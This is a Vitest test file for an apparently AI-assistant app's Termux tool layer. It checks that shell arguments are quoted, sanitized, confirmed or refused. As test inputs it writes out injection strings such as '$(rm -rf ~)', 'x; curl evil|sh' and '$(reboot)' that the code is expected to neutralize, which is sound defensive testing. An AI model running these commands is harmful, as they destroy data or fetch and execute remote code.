import { beforeEach, describe, expect, it, vi } from 'vitest';

const termux = vi.hoisted(() => ({ executeTermuxCommand: vi.fn() }));
const workspaces = vi.hoisted(() => ({ listWorkspaces: vi.fn() }));

vi.mock('../src/services/logger', () => ({ logger: { log: vi.fn() } }));
vi.mock('../src/services/termuxPlugin', () => termux);
vi.mock('../src/services/workspaces/WorkspaceService', () => ({ workspaceService: workspaces }));
vi.mock('../src/services/documents/DocumentIngestionService', () => ({ DocumentIngestionService: class { } }));
vi.mock('../src/services/documents/DocumentRetriever', () => ({ DocumentRetriever: class { } }));
vi.mock('../src/services/documents/DocumentChunker', () => ({ DocumentChunker: class { } }));
vi.mock('../src/services/database/knowledgeDatabase', () => ({ getKnowledgeDatabase: vi.fn() }));
vi.mock('../src/services/image/imageGenService', () => ({ imageGenService: {} }));
vi.mock('../src/services/webSearch', () => ({ searchWeb: vi.fn(), formatSearchResultsForContext: vi.fn() }));
vi.mock('../src/services/calendar', () => ({ createCalendarEvent: vi.fn(), listCalendarEvents: vi.fn() }));
vi.mock('../src/services/calendar/calendarService', () => ({}));
vi.mock('../src/services/calendar/taskDatabase', () => ({}));
vi.mock('../src/utils/fileSystemAdapter', () => ({ FileSystemAdapter: {}, Directory: {}, Encoding: {} }));
vi.mock('text-embedding-capacitor', () => ({ TextEmbedding: {} }));
vi.mock('@capacitor/local-notifications', () => ({ LocalNotifications: {} }));
vi.mock('@capacitor/clipboard', () => ({ Clipboard: { write: vi.fn().mockRejectedValue(new Error('no clipboard')) } }));
vi.mock('@capawesome/capacitor-file-picker', () => ({ FilePicker: {} }));

import { shellQuote, parsePackageNames, clampInt } from '../src/services/tools/shellArgs';
import { executeTool, needsConfirmation, isToolDenied } from '../src/services/tools';
import { TOOL_DEFINITIONS, getGeminiFunctionDeclarations } from '../src/services/toolDefinitions';

const ctx = {
  llmConfig: {}, todos: [], memories: [], addTodo: vi.fn(), completeTodo: vi.fn(), addMemory: vi.fn(),
  confirmationMode: 'dangerous' as const,
};
const lastCommand = () => termux.executeTermuxCommand.mock.calls[termux.executeTermuxCommand.mock.calls.length - 1]?.[0] as string;

beforeEach(() => {
  termux.executeTermuxCommand.mockReset();
  termux.executeTermuxCommand.mockResolvedValue({ success: true, stdout: '', stderr: '', exitCode: 0 });
});

describe('shell arguments', () => {
  it('quotes values so the shell sees one inert word', () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
    expect(shellQuote('$(rm -rf ~)')).toBe(`'$(rm -rf ~)'`);
  });

  it('accepts only plain package names', () => {
    expect(parsePackageNames('python git')).toEqual(['python', 'git']);
    expect(parsePackageNames('python; curl evil|sh')).toBeNull();
    expect(parsePackageNames('$(id)')).toBeNull();
    expect(parsePackageNames('')).toBeNull();
  });

  it('clamps numbers and rejects non-numbers', () => {
    expect(clampInt('1; rm -rf ~', 1, 10, 5)).toBe(5);
    expect(clampInt(99999, 1, 5000, 500)).toBe(5000);
  });
});

describe('termux tools', () => {
  it('asks before installing packages and refuses injected names', async () => {
    expect(needsConfirmation('termux_install_pkg', 'dangerous', {}, {})).toBe(true);
    const bad = await executeTool({ name: 'termux_install_pkg', args: { package: 'x; curl evil|sh' } }, ctx);
    expect(bad.success).toBe(false);
    expect(termux.executeTermuxCommand).not.toHaveBeenCalled();
    await executeTool({ name: 'termux_install_pkg', args: { package: 'python' } }, ctx);
    expect(lastCommand()).toBe('pkg install -y python');
  });

  it('quotes notification text and sanitizes numeric and enum arguments', async () => {
    await executeTool({ name: 'termux_notification', args: { title: "x'; reboot; echo '", content: 'body' } }, ctx);
    expect(lastCommand()).toBe(`termux-notification -t 'x'\\''; reboot; echo '\\''' -c 'body'`);
    await executeTool({ name: 'termux_vibrate', args: { duration: '1; reboot' } }, ctx);
    expect(lastCommand()).toBe('termux-vibrate -d 500');
    const vol = await executeTool({ name: 'set_volume', args: { stream: 'music; reboot', level: 5 } }, ctx);
    expect(vol.success).toBe(false);
    await executeTool({ name: 'send_telegram', args: { username: '$(reboot)', message: 'hi' } }, ctx);
    expect(lastCommand()).toBe(`am start -a android.intent.action.VIEW -d 'tg://msg?to=%24(reboot)&text=hi'`);
  });
});

describe('tool catalog', () => {
  it('declares every tool name once and sends no empty parameter schema to Gemini', () => {
    const names = TOOL_DEFINITIONS.map(t => t.name);
    expect(new Set(names).size).toBe(names.length);
    for (const decl of getGeminiFunctionDeclarations()) {
      if (decl.parameters) expect(Object.keys((decl.parameters as any).properties).length).toBeGreaterThan(0);
    }
  });

  it('runs tools implemented by their definition handler instead of reporting them unknown', async () => {
    workspaces.listWorkspaces.mockResolvedValue([]);
    const result = await executeTool({ name: 'list_workspaces', args: {} }, ctx);
    expect(result).toEqual({ success: true, message: 'No workspaces found.' });
    const unknown = await executeTool({ name: 'no_such_tool', args: {} }, ctx);
    expect(unknown.success).toBe(false);
  });

  it('recognizes denied tools', () => {
    expect(isToolDenied('send_whatsapp', { send_whatsapp: 'deny' })).toBe(true);
    expect(isToolDenied('send_whatsapp', {})).toBe(false);
  });
});
